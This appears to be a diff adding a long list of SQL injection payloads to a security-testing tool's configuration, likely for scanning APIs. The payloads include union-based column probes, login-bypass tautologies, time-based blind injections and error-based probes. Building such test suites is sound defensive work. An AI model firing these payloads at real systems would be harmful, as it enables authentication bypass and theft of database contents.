+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>" or ""^"</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>" or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1' ORDER BY 1,2--+</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>-- or #</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>OR 1=0</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin'/*</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>OR 1=1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin') or '1'='1'#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 11#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin") or ("1"="1"--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>&amp;&amp;SLEEP(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' or '' '</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 6--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 19--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 22#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>OR x=y--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>")) or pg_sleep(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>%00</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>pg_SLEEP(5)</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 7506=9091 AND ('5913=5913</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 20--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND false</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'%20and%201=2%20--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>sleep(5)#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>pg_SLEEP(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>%2c(select%20*%20from%20(select(sleep(10)))a)</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' OR '' = '</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>or 1=1/*</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 17#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>RANDOMBLOB(500000000/2)</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 2--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 30--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin" or 1=1#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1 AND (SELECT * FROM Users) = 1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1)) or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' or ''-'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 28#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 29--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AnD SLEEP(5)</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>")) or sleep(5)="</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' or ''*'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1' GROUP BY 1,2,--+</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 17--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 31337--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>or true--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>-1 UNION SELECT 1 INTO @,@,@</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>-- -</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 15#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>') or true--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1 or pg_sleep(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>and (select substring(@@version,3,1))='X'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>-1 UNION SELECT 1 INTO @,@</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 1=0#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1' ORDER BY 2--+</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 26#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' OR 1 -- -</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>and (select substring(@@version,1,1))='M'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'='</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' AnD SLEEP(5) ANd '1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>or 1=1--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' or "</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>";waitfor delay '0:0:5'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AnD SLEEP(5)#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 1083=1083 AND ('1427=1427</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>HAVING 1=0--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>RANDOMBLOB(1000000000/2)</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin" or "1"="1"#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 27--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 1=1#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1' ORDER BY 3--+</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>WHERE 1=1 AND 1=0--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>OR 1=0--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 15--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1' GROUP BY 1,2,3--+</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 1=0 AND '%'='</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1*56</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>" or ""&amp;"</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),4#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 2#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>or SLEEP(5)#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>&amp;&amp;SLEEP(5)</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin' #</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>@@variable</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin') or ('1'='1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin" or "1"="1"--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>" or ""-"</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin') or '1'='1'/*</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>pg_sleep(5)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>" or true--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 1=1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>')) or sleep(5)='</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' or sleep(5)#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 1=0</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>;waitfor delay '0:0:5'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>;%00</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin' or 1=1--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 25--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin" or "1"="1"/*</con:sqlInjectionStrings>
